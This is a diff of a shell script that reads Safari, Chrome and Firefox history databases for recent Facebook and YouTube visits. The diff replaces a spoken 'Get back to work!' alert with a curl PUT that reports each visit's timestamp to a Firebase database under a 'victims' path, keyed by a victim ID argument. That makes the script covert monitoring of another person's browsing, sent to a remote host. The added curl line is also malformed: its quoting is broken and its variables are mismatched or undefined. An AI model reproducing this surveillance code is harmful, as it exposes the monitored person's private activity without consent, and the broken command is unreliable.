@@ -2,7 +2,10 @@
 # Lots of information here:
 # http://2016.padjo.org/tutorials/sqlite-your-browser-history/
 
+victimID="$1"
+
 sites=(facebook.com youtube.com)
+lastNSeconds=2
 
 function safariQuery() {
   sqlite3 "$HOME/Library/Safari/History.db" "
@@ -23,7 +26,7 @@ function chromeQuery() {
     SELECT last_visit_time, title, url
     FROM urls
     WHERE
-      last_visit_time > $(( (`date '+%s'` -2) * 10000000)) AND (
+      last_visit_time > $(( (`date '+%s'` - lastNSeconds) * 10000000)) AND (
       url like '%facebook.com%' OR
       url like '%youtube.com%' )
     ORDER BY last_visit_time DESC
@@ -37,7 +40,7 @@ function firefoxQuery(){
     SELECT last_visit_date, url
     FROM moz_places
     WHERE
-      last_visit_date > $(( (`date '+%s'` -1) * 1000000)) AND (
+      last_visit_date > $(( (`date '+%s'` - lastNSeconds) * 1000000)) AND (
       url like '%facebook.com%' OR
       url like '%youtube.com%' )
     ORDER BY last_visit_date DESC
@@ -47,7 +50,7 @@ function firefoxQuery(){
 
 
 if [ ! -z `firefoxQuery` ]; then
-  say "Get back to work!"
+  curl -X PUT -d "`date '+%s'`" "curl -s "https://${firebaseProject}.firebaseio.com/victims/$victim/YT_FB_visit.json"
 fi
 
 sleep 1.1;
